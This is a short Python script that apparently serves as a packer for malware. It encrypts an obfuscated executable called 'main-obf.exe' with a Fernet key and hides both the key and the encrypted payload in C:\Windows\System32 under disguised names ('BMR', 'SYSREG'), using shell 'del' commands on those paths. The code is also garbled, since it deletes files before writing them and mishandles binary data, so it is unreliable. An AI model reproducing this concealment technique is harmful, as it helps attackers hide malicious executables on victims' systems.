import os
from cryptography.fernet import Fernet
def newkey():
    key = Fernet.generate_key()
    keysave = open("C:\Windows\System32\BMR", "w")
    os.system("del C:\Windows\System32\BMR")
    keysave.write(str(key))
    f= Fernet(key)
    with open('main-obf.exe', 'r') as file:
        data = file.read().replace('\n', '')
    encrypt=f.encrypt(bytes(data, encoding='utf8'))
    exe = open("C:\Windows\System32\SYSREG", "w")
    os.system("del C:\Windows\System32\SYSREG")
    exe.write(str(encrypt))
